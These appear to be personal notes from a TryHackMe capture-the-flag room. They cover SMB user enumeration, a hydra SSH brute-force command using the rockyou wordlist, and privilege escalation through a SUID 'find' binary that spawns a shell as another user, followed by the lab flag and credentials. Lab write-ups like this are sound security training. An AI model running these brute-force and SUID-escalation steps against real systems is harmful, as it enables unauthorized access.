# Enum users with SMB
- kel
- des
- tryhackme

# Brute Froce SSH
hydra -l users -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt ssh://10.10.19.174 -t 4 -v

``[22][ssh] host: 10.10.19.174   login: tryhackme   password: thebest``

# SUID
-rwsr-sr-x 1 des des 238080 Nov  5  2017 /usr/bin/find

tryhackme@THM_exploit:~$ cd /usr/bin/
tryhackme@THM_exploit:/usr/bin$ ./find . -exec /bin/bash -p \;

bash-4.4$ whoami
des
bash-4.4$ cd /home/des/

bash-4.4$ cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64
bash-4.4$


Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64